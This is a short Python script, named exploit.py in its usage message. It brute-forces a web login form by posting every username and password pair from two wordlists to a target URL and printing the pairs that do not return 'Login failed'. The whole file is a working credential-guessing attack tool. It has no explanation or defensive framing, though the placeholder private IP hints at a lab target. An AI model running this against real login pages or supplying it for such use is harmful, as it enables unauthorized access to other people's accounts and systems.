import requests
import sys
# Making a get request


if len(sys.argv)==7:
    if sys.argv[1]=="--url" and sys.argv[3]=="--user" and sys.argv[5]=="--password":

        url=sys.argv[2]
        #proxy={"http":"127.0.0.1:8080"}
        usernames=[]
        passwords=[]

        with open(sys.argv[4],"r") as File:
                Lines=File.readlines()
                for line in Lines:
                    for word in line.split():
                        usernames.append(word)

        with open(sys.argv[6],"r") as File:
                Lines=File.readlines()
                for line in Lines:
                    for word in line.split():
                        passwords.append(word)
        
        for name in usernames:
            for passwd in passwords:
                credentials={"username":name,"password":passwd,"Login":"Login"}
                req=requests.post(url,data=credentials)
                if req.text.find("Login failed")== -1:
                    print('''\n--------------------------------------\n'{}':'{}' are correct\n-------------------------------------\n'''.format(name,passwd))
                else :
                    print("{}:{} are not correct".format(name,passwd))



else :
    print("\n incorrect argumnts...pass args in following format\n python exploit.py --url <http://10.10.10.10/login.php>  --user <wordlist_user> --password <password_wordlist>")